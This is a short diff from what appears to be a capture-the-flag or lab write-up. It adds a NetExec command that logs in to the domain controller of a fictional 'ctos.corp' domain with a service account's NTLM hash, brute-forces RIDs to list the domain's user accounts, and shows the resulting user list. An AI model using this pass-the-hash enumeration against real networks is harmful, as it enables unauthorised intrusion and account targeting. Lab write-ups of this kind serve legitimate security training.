@@ -773,5 +773,24 @@ SMB         10.1.24.233     445    DC01             SYSVOL          READ        
 Only default shares on the domain controller
 
 ```python
-
+nxc smb dc01.ctos.corp -u 'svc_web' -H '4014777d5f38cb74d24f096972f47969' --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
+Administrator
+Guest
+krbtgt
+DC01$
+j_wilson
+l_conrad
+m_chen
+s_patel
+e_rodriguez
+d_kim
+it_ops_lead
+svc_web
+svc_backup
+svc_infra_mgr
+IT-WS01$
+WEB-01$
 ```
+
+Ill grab all the users in the domain!
+
